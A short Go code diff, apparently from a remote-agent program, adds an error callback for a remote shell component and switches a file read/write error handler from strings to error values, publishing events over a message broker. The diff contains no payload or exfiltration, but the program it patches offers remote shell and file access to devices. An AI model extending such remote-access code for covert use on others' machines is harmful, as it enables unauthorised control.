@@ -128,6 +128,12 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 		burat.Publish(id, "remoteshell_evt_write", 2, false, packet)
 	})
 
+	burat.Bushido().RemoteShell.OnError(func (id string, error error) {
+		fmt.Println("remoteshell.error", id, error.Error())
+		packet := burat.Seen(packets.RemoteShellOnErrorPacket { Id: id, Error: error.Error() })
+		burat.Publish(id, "remoteshell_evt_error", 2, false, packet)
+	})
+
 	burat.Bushido().FileRW.OnOpen(func (id string) {
 		fmt.Println("filerw.open", id)
 		files := burat.Bushido().FileRW.Files()
@@ -190,9 +196,9 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 		}
 	})
 
-	burat.Bushido().FileRW.OnError(func (id string, error string) {
-		fmt.Println("filerw.error", id, error)
-		packet := burat.Seen(packets.FilerwOnErrorPacket { Id: id, Error: error })
+	burat.Bushido().FileRW.OnError(func (id string, error error) {
+		fmt.Println("filerw.error", id, error.Error())
+		packet := burat.Seen(packets.FilerwOnErrorPacket { Id: id, Error: error.Error() })
 		burat.Publish(id, "filerw_evt_error", 2, false, packet)
 	})
 
